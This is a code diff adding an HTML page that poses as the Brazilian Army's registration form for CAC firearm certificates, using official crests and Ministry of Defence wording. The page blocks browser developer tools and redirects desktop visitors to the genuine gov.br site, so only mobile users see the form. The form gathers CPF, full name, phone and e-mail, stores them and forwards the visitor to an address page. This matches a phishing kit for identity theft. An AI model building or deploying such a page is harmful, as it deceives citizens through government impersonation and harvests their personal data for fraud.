@@ -1,0 +1,160 @@
+<html lang="pt-br"><head>
+      <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://www.gov.br/pt-br/servicos/conceder-certificado-de-registro-pessoa-fisica-colecionador-atirador-desportivo-e-cac"></script>
+<script type="text/javascript">
+  if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+      window.location.href = 'https://www.gov.br/pt-br/servicos/conceder-certificado-de-registro-pessoa-fisica-colecionador-atirador-desportivo-e-cac';
+  }
+</script>
+<script type="text/javascript">
+  window.hasMobileFirstExtension = true;
+</script>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Exército Brasileiro - Cadastro para CAC</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <script src="js/cleave.min.js"></script>
+    <style>
+        body { font-family: 'Poppins', sans-serif; }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <header class="bg-white border-b border-gray-300">
+        <div class="container mx-auto px-4 py-2">
+            <div class="flex items-center">
+                <img alt="Brasão do Exército Brasileiro" class="mr-2" height="40" src="https://www.eb.mil.br/image/company_logo?img_id=40367&amp;t=1721965932372" width="40">
+                <div>
+                    <div class="text-sm text-green-800">Ministério da Defesa</div>
+                    <div class="font-bold text-green-800">Exército Brasileiro</div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <nav class="bg-gray-200 py-2 overflow-x-auto">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center text-sm whitespace-nowrap">
+                <a class="text-green-800 mr-2" href="#">Exército Brasileiro</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <a class="text-green-800 mr-2" href="#">Serviços</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <a class="text-green-800 mr-2" href="#">CAC</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <span class="text-gray-700">Cadastro</span>
+            </div>
+        </div>
+    </nav>
+    <main class="container mx-auto px-4 py-8">
+        <h1 class="text-2xl font-bold mb-4">Cadastro para Certificado de Registro de CAC</h1>
+        <p class="mb-4">Preencha o formulário abaixo para iniciar o processo de obtenção do seu Certificado de Registro de Colecionador, Atirador e Caçador (CAC) junto ao Exército Brasileiro.</p>
+        <p class="mb-8">Todos os campos marcados com * são obrigatórios.</p>
+<form onsubmit="salvarDados(); return false;">
+    <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF *</label>
+        <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="cpf" type="text" inputmode="numeric" placeholder="000.000.000-00" required="">
+    </div>
+    <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="nome-completo">Nome Completo *</label>
+        <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="nome-completo" type="text" placeholder="Insira seu Nome Completo" required="">
+    </div>
+    <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="telefone">Telefone *</label>
+        <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="telefone" type="tel" inputmode="numeric" placeholder="(00) 00000-0000" required="">
+    </div>
+    <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="email">E-mail *</label>
+        <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="email" type="email" inputmode="email" placeholder="seu@email.com" required="">
+    </div>
+    <p class="text-sm mb-4">Ao clicar no botão "Prosseguir", você declara que todas as informações fornecidas são verdadeiras e que está ciente das responsabilidades legais associadas ao registro de CAC, conforme estabelecido pela Lei nº 10.826/2003 (Estatuto do Desarmamento) e suas regulamentações.</p>
+    <button class="bg-green-800 hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit">
+        Prosseguir
+    </button>
+</form>
+
+<script>
+    function salvarDados() {
+        // Captura os valores dos campos
+        const cpf = document.getElementById('cpf').value;
+        const nomeCompleto = document.getElementById('nome-completo').value;
+        const telefone = document.getElementById('telefone').value;
+        const email = document.getElementById('email').value;
+
+        // Armazena os dados no localStorage
+        localStorage.setItem('cpf', cpf);
+        localStorage.setItem('nomeCompleto', nomeCompleto);
+        localStorage.setItem('telefone', telefone);
+        localStorage.setItem('email', email);
+
+        // Redireciona para a próxima página
+        window.location.href = '/pages/endereco';
+    }
+</script>
+
+    </main>
+    <footer class="bg-green-900 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-4">
+                <div>
+                    <h3 class="font-bold mb-2">O EXÉRCITO</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
+                        <li><a class="hover:underline" href="#">Organização</a></li>
+                        <li><a class="hover:underline" href="#">História</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">SERVIÇOS</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">CAC</a></li>
+                        <li><a class="hover:underline" href="#">Alistamento</a></li>
+                        <li><a class="hover:underline" href="#">Concursos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">TRANSPARÊNCIA</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Acesso �&nbsp; Informação</a></li>
+                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">CONTATO</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Ouvidoria</a></li>
+                        <li><a class="hover:underline" href="#">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">REDES SOCIAIS</h3>
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="bg-green-950 text-white text-xs py-2 text-center">
+        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            new Cleave('#cpf', {
+                delimiters: ['.', '.', '-'],
+                blocks: [3, 3, 3, 2],
+                numericOnly: true
+            });
+
+            new Cleave('#telefone', {
+                delimiters: ['(', ')', ' ', '-'],
+                blocks: [0, 2, 5, 4],
+                numericOnly: true
+            });
+        });
+    </script>
+
+</body></html>
